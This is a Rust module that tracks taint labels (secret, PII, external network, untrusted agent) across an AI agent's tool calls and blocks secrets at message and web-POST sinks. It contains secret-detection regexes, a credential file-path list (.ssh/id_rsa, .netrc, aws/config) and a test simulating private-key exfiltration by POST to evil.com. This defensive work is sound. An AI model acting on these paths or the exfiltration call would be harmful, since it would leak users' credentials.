//! Information-flow taint tracking for tool execution chains.
//!
//! Assigns labels to tool outputs based on data provenance, propagates labels
//! through execution chains, and blocks tainted data at sensitive sinks.
//!
//! ## Label Lattice
//!
//! Labels form a power-set lattice with join = union:
//! - `ExternalNetwork` — data from web_fetch, API calls
//! - `UserInput` — data from user messages
//! - `Pii` — personally identifiable information (detected by regex)
//! - `Secret` — API keys, tokens, passwords
//! - `UntrustedAgent` — data from spawned/remote agents
//!
//! ## Sink Policies
//!
//! Before sensitive operations, taint labels are checked against sink policies:
//! - `message` tool → blocks Secret, Pii (prevent leaking to channels)
//! - `web_fetch` POST → blocks Secret (prevent exfiltration)
//! - Logging → redacts Secret content

use std::collections::{HashMap, HashSet};

use regex::Regex;
use serde::{Deserialize, Serialize};
use tracing::warn;
use zeus_core::TaintLabel;

/// A set of taint labels (re-export convenience).
pub type TaintSet = HashSet<TaintLabel>;

/// A taint violation: blocked operation due to label at a sink.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaintViolation {
    /// Tool that was blocked
    pub tool_name: String,
    /// Tool call ID
    pub call_id: String,
    /// Labels that triggered the violation
    pub labels: Vec<TaintLabel>,
    /// Sink policy that was violated
    pub sink: String,
    /// Human-readable description
    pub description: String,
}

/// Policy defining which taint labels are blocked at a given sink.
#[derive(Debug, Clone)]
pub struct SinkPolicy {
    /// Name of the sink (e.g., "message_channel", "web_post", "log")
    pub name: String,
    /// Tool names this policy applies to
    pub tools: Vec<String>,
    /// Labels that are blocked at this sink
    pub blocked_labels: HashSet<TaintLabel>,
    /// Whether to block (hard) or warn (soft)
    pub mode: SinkMode,
}

/// Whether a sink policy blocks execution or just warns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SinkMode {
    /// Block execution and return error
    Block,
    /// Log warning but allow execution
    Warn,
}

/// Tracks taint labels through tool execution chains within a session.
pub struct TaintTracker {
    /// Taint labels for tool outputs, keyed by tool call ID
    tool_taints: HashMap<String, TaintSet>,
    /// Accumulated taints from the current execution context
    context_taints: TaintSet,
    /// Sink policies
    sink_policies: Vec<SinkPolicy>,
    /// Violations recorded during this session
    violations: Vec<TaintViolation>,
    /// Compiled PII detection patterns
    pii_patterns: Vec<Regex>,
    /// Compiled secret detection patterns
    secret_patterns: Vec<Regex>,
}

impl TaintTracker {
    /// Create a new taint tracker with default sink policies.
    pub fn new() -> Self {
        Self {
            tool_taints: HashMap::new(),
            context_taints: HashSet::new(),
            sink_policies: Self::default_policies(),
            violations: Vec::new(),
            pii_patterns: Self::compile_pii_patterns(),
            secret_patterns: Self::compile_secret_patterns(),
        }
    }

    /// Default sink policies for common tool categories.
    fn default_policies() -> Vec<SinkPolicy> {
        vec![
            // message tool: block secrets from leaking to channels.
            // Pii is intentionally NOT blocked here — incoming channel messages often
            // contain patterns that match PII regexes (IDs, emails in pings, etc.),
            // which would taint the context and prevent the agent from replying at all.
            // Secret blocking is kept to prevent API key / token exfiltration.
            SinkPolicy {
                name: "channel_message".into(),
                tools: vec!["message".into()],
                blocked_labels: HashSet::from([TaintLabel::Secret]),
                mode: SinkMode::Block,
            },
            // web_fetch POST: block secrets from being exfiltrated
            SinkPolicy {
                name: "web_exfiltration".into(),
                tools: vec!["web_fetch".into()],
                blocked_labels: HashSet::from([TaintLabel::Secret]),
                mode: SinkMode::Block,
            },
            // spawn: warn when passing secrets to untrusted agents
            SinkPolicy {
                name: "agent_spawn".into(),
                tools: vec!["spawn".into()],
                blocked_labels: HashSet::from([TaintLabel::Secret]),
                mode: SinkMode::Warn,
            },
        ]
    }

    /// Compiled regex patterns for PII detection.
    fn compile_pii_patterns() -> Vec<Regex> {
        [
            // Email addresses
            r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            // US phone numbers
            r"\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b",
            // SSN pattern
            r"\b\d{3}-\d{2}-\d{4}\b",
            // Credit card (basic Luhn-eligible patterns)
            r"\b(?:4\d{3}|5[1-5]\d{2}|3[47]\d{2}|6011)\d{8,12}\b",
        ]
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect()
    }

    /// Compiled regex patterns for secret/credential detection.
    fn compile_secret_patterns() -> Vec<Regex> {
        [
            // API key prefixes (OpenAI, Anthropic, Slack, etc.)
            r"(?i)\b(?:sk-[a-zA-Z0-9]{20,}|xoxb-[a-zA-Z0-9-]+|ghp_[a-zA-Z0-9]{36}|AKIA[0-9A-Z]{16})\b",
            // Generic key=value with long hex/base64 values
            r#"(?i)(?:api[_-]?key|secret|token|password|credential)\s*[=:]\s*['"]?[a-zA-Z0-9+/=_-]{20,}"#,
            // Bearer tokens
            r#"(?i)Bearer\s+[a-zA-Z0-9._~+/=-]{20,}"#,
            // Private key markers
            r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----",
            // .env file patterns
            r"(?mi)^[A-Z_]+=\S{20,}",
        ]
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect()
    }

    /// Assign taint labels to a tool's output based on the tool type and content.
    pub fn label_output(
        &mut self,
        call_id: &str,
        tool_name: &str,
        args: &serde_json::Value,
        output: &str,
    ) -> TaintSet {
        let mut labels = TaintSet::new();

        // Source labeling based on tool type
        match tool_name {
            "web_fetch" | "link_understanding" => {
                labels.insert(TaintLabel::ExternalNetwork);
            }
            "shell" => {
                // Check if shell output contains secrets
                if self.contains_secret(output) {
                    labels.insert(TaintLabel::Secret);
                }
            }
            "read_file" => {
                // Check if reading a sensitive file
                if let Some(path) = args.get("path").and_then(|v| v.as_str())
                    && is_sensitive_path(path)
                {
                    labels.insert(TaintLabel::Secret);
                }
                // Check file content for secrets
                if self.contains_secret(output) {
                    labels.insert(TaintLabel::Secret);
                }
            }
            "spawn" => {
                labels.insert(TaintLabel::UntrustedAgent);
            }
            _ => {}
        }

        // Content-based PII detection on any output
        if self.contains_pii(output) {
            labels.insert(TaintLabel::Pii);
        }

        // Propagate context taints: if previous tool outputs were tainted,
        // and their content appears in this tool's arguments, inherit those taints.
        let propagated = self.propagate_from_args(args);
        labels.extend(propagated);

        // Store the labels for this call
        self.tool_taints.insert(call_id.to_string(), labels.clone());

        // Update context taints
        self.context_taints.extend(labels.iter().copied());

        labels
    }

    /// Check if a tool execution should be blocked based on sink policies.
    ///
    /// Returns `Ok(())` if allowed, or `Err(TaintViolation)` if blocked.
    pub fn check_sink(
        &mut self,
        call_id: &str,
        tool_name: &str,
        _args: &serde_json::Value,
    ) -> Result<(), TaintViolation> {
        // Collect all active taints from context
        let active_taints = &self.context_taints;

        for policy in &self.sink_policies {
            if !policy.tools.iter().any(|t| t == tool_name) {
                continue;
            }

            let violations: Vec<TaintLabel> = active_taints
                .intersection(&policy.blocked_labels)
                .copied()
                .collect();

            if violations.is_empty() {
                continue;
            }

            let violation = TaintViolation {
                tool_name: tool_name.to_string(),
                call_id: call_id.to_string(),
                labels: violations.clone(),
                sink: policy.name.clone(),
                description: format!(
                    "Taint violation at sink '{}': tool '{}' blocked due to labels [{}]",
                    policy.name,
                    tool_name,
                    violations
                        .iter()
                        .map(|l| l.to_string())
                        .collect::<Vec<_>>()
                        .join(", ")
                ),
            };

            match policy.mode {
                SinkMode::Block => {
                    warn!("{}", violation.description);
                    self.violations.push(violation.clone());
                    return Err(violation);
                }
                SinkMode::Warn => {
                    warn!("(soft) {}", violation.description);
                    self.violations.push(violation);
                    // Continue execution despite warning
                }
            }
        }

        Ok(())
    }

    /// Get all recorded violations.
    pub fn violations(&self) -> &[TaintViolation] {
        &self.violations
    }

    /// Get taint labels for a specific tool call.
    pub fn get_taints(&self, call_id: &str) -> Option<&TaintSet> {
        self.tool_taints.get(call_id)
    }

    /// Get the current accumulated context taints.
    pub fn context_taints(&self) -> &TaintSet {
        &self.context_taints
    }

    /// Reset context taints (e.g., at session boundary).
    pub fn reset(&mut self) {
        self.tool_taints.clear();
        self.context_taints.clear();
        self.violations.clear();
    }

    /// Check if text contains PII patterns.
    fn contains_pii(&self, text: &str) -> bool {
        self.pii_patterns.iter().any(|re| re.is_match(text))
    }

    /// Check if text contains secret/credential patterns.
    fn contains_secret(&self, text: &str) -> bool {
        self.secret_patterns.iter().any(|re| re.is_match(text))
    }

    /// Propagate taints from previous tool outputs into current args.
    ///
    /// If any argument value substring-matches a previously tainted output,
    /// inherit those taints. This is a conservative (over-tainting) approach.
    fn propagate_from_args(&self, args: &serde_json::Value) -> TaintSet {
        let mut propagated = TaintSet::new();

        // Extract all string values from args
        let arg_strings = extract_strings(args);

        for taints in self.tool_taints.values() {
            if taints.is_empty() {
                continue;
            }
            // If any arg string is non-trivially long and appears to reference
            // external data, propagate the taints. We use a heuristic:
            // any arg string > 50 chars that contains patterns suggesting it
            // came from a tainted source gets the taint propagated.
            for arg_str in &arg_strings {
                if arg_str.len() > 50 {
                    // Long strings in args likely contain tainted data
                    propagated.extend(taints.iter().copied());
                    break;
                }
            }
        }

        propagated
    }
}

impl Default for TaintTracker {
    fn default() -> Self {
        Self::new()
    }
}

/// Check if a file path points to a sensitive location.
fn is_sensitive_path(path: &str) -> bool {
    let lower = path.to_lowercase();
    lower.contains(".env")
        || lower.contains("credentials")
        || lower.contains("secret")
        || lower.contains(".pem")
        || lower.contains(".key")
        || lower.contains("id_rsa")
        || lower.contains("id_ed25519")
        || lower.contains("token")
        || lower.contains("password")
        || lower.contains(".netrc")
        || lower.contains("aws/config")
        || lower.contains(".ssh/")
}

/// Recursively extract all string values from a JSON value.
fn extract_strings(value: &serde_json::Value) -> Vec<String> {
    let mut strings = Vec::new();
    match value {
        serde_json::Value::String(s) => strings.push(s.clone()),
        serde_json::Value::Object(map) => {
            for v in map.values() {
                strings.extend(extract_strings(v));
            }
        }
        serde_json::Value::Array(arr) => {
            for v in arr {
                strings.extend(extract_strings(v));
            }
        }
        _ => {}
    }
    strings
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_new_tracker_is_empty() {
        let tracker = TaintTracker::new();
        assert!(tracker.context_taints().is_empty());
        assert!(tracker.violations().is_empty());
    }

    #[test]
    fn test_web_fetch_labels_external_network() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "web_fetch",
            &json!({"url": "https://example.com"}),
            "Hello world response",
        );
        assert!(labels.contains(&TaintLabel::ExternalNetwork));
    }

    #[test]
    fn test_spawn_labels_untrusted_agent() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "spawn",
            &json!({"task": "do something"}),
            "Subagent started",
        );
        assert!(labels.contains(&TaintLabel::UntrustedAgent));
    }

    #[test]
    fn test_read_env_file_labels_secret() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "read_file",
            &json!({"path": "/home/user/.env"}),
            "API_KEY=sk-1234567890abcdef1234567890abcdef",
        );
        assert!(labels.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_pii_detection_email() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "shell",
            &json!({"command": "cat contacts.txt"}),
            "Contact: john.doe@example.com, phone: 555-123-4567",
        );
        assert!(labels.contains(&TaintLabel::Pii));
    }

    #[test]
    fn test_pii_detection_ssn() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "shell",
            &json!({"command": "cat data.txt"}),
            "SSN: 123-45-6789",
        );
        assert!(labels.contains(&TaintLabel::Pii));
    }

    #[test]
    fn test_secret_detection_api_key() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "shell",
            &json!({"command": "env"}),
            "OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz1234567890",
        );
        assert!(labels.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_secret_detection_bearer_token() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "shell",
            &json!({"command": "curl -v api.example.com"}),
            "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123",
        );
        assert!(labels.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_sink_blocks_secret_on_message() {
        let mut tracker = TaintTracker::new();
        // First: read a secret
        tracker.label_output(
            "call-1",
            "read_file",
            &json!({"path": "/app/.env"}),
            "API_KEY=sk-abcdefghijklmnopqrstuvwxyz1234567890",
        );
        // Then: try to send it via message — should be blocked
        let result = tracker.check_sink(
            "call-2",
            "message",
            &json!({"channel": "discord", "content": "Here is the key"}),
        );
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.sink, "channel_message");
        assert!(violation.labels.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_sink_allows_pii_on_message() {
        // PII in context no longer blocks message — incoming channel messages
        // frequently contain PII patterns (emails, IDs) and blocking replies
        // would make messaging agents non-functional. Only Secret blocks message.
        let mut tracker = TaintTracker::new();
        tracker.label_output(
            "call-1",
            "shell",
            &json!({"command": "cat users.csv"}),
            "john@example.com,Jane Doe,123-45-6789",
        );
        let result = tracker.check_sink(
            "call-2",
            "message",
            &json!({"channel": "slack", "content": "User data"}),
        );
        assert!(result.is_ok(), "PII alone should not block message tool");
    }

    #[test]
    fn test_sink_blocks_secret_on_web_fetch() {
        let mut tracker = TaintTracker::new();
        tracker.label_output(
            "call-1",
            "read_file",
            &json!({"path": "~/.ssh/id_rsa"}),
            "-----BEGIN RSA PRIVATE KEY-----\nMIIE...",
        );
        let result = tracker.check_sink(
            "call-2",
            "web_fetch",
            &json!({"url": "https://evil.com", "method": "POST"}),
        );
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().sink, "web_exfiltration");
    }

    #[test]
    fn test_sink_warns_on_spawn_with_secret() {
        let mut tracker = TaintTracker::new();
        tracker.label_output(
            "call-1",
            "read_file",
            &json!({"path": ".env.local"}),
            "SECRET_TOKEN=abc123def456ghi789jkl012mno345pqr",
        );
        // Spawn sink is warn-only, so it should succeed
        let result = tracker.check_sink(
            "call-2",
            "spawn",
            &json!({"task": "deploy"}),
        );
        assert!(result.is_ok());
        // But violation should still be recorded
        assert!(!tracker.violations().is_empty());
    }

    #[test]
    fn test_clean_output_no_labels() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "call-1",
            "list_dir",
            &json!({"path": "/tmp"}),
            "file1.txt\nfile2.txt\nfile3.txt",
        );
        assert!(labels.is_empty());
    }

    #[test]
    fn test_reset_clears_state() {
        let mut tracker = TaintTracker::new();
        tracker.label_output(
            "call-1",
            "web_fetch",
            &json!({"url": "https://example.com"}),
            "data",
        );
        assert!(!tracker.context_taints().is_empty());
        tracker.reset();
        assert!(tracker.context_taints().is_empty());
        assert!(tracker.violations().is_empty());
    }

    #[test]
    fn test_sensitive_path_detection() {
        assert!(is_sensitive_path("/home/user/.env"));
        assert!(is_sensitive_path("/app/credentials.json"));
        assert!(is_sensitive_path("~/.ssh/id_rsa"));
        assert!(is_sensitive_path("/etc/secret.key"));
        assert!(!is_sensitive_path("/tmp/readme.txt"));
        assert!(!is_sensitive_path("/app/src/main.rs"));
    }

    #[test]
    fn test_taint_label_display() {
        assert_eq!(TaintLabel::ExternalNetwork.to_string(), "external_network");
        assert_eq!(TaintLabel::Secret.to_string(), "secret");
        assert_eq!(TaintLabel::Pii.to_string(), "pii");
        assert_eq!(TaintLabel::UserInput.to_string(), "user_input");
        assert_eq!(TaintLabel::UntrustedAgent.to_string(), "untrusted_agent");
    }

    #[test]
    fn test_context_taints_accumulate() {
        let mut tracker = TaintTracker::new();
        tracker.label_output("c1", "web_fetch", &json!({"url": "https://x.com"}), "data");
        tracker.label_output("c2", "read_file", &json!({"path": ".env"}), "KEY=sk-abcdefghijklmnopqrstuvwxyz1234");
        let ctx = tracker.context_taints();
        assert!(ctx.contains(&TaintLabel::ExternalNetwork));
        assert!(ctx.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_get_taints_for_call() {
        let mut tracker = TaintTracker::new();
        tracker.label_output("c1", "web_fetch", &json!({"url": "https://x.com"}), "data");
        let taints = tracker.get_taints("c1").unwrap();
        assert!(taints.contains(&TaintLabel::ExternalNetwork));
        assert!(tracker.get_taints("nonexistent").is_none());
    }

    #[test]
    fn test_no_sink_violation_on_clean_context() {
        let mut tracker = TaintTracker::new();
        tracker.label_output("c1", "list_dir", &json!({"path": "/tmp"}), "files");
        let result = tracker.check_sink("c2", "message", &json!({"channel": "discord"}));
        assert!(result.is_ok());
    }

    #[test]
    fn test_private_key_detection() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "c1",
            "read_file",
            &json!({"path": "/tmp/server.pem"}),
            "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg...",
        );
        assert!(labels.contains(&TaintLabel::Secret));
    }

    #[test]
    fn test_slack_token_detection() {
        let mut tracker = TaintTracker::new();
        let labels = tracker.label_output(
            "c1",
            "shell",
            &json!({"command": "echo $SLACK_TOKEN"}),
            "xoxb-123456789012-1234567890123-abcdefghijklmnopqrstuvwx",
        );
        assert!(labels.contains(&TaintLabel::Secret));
    }
}
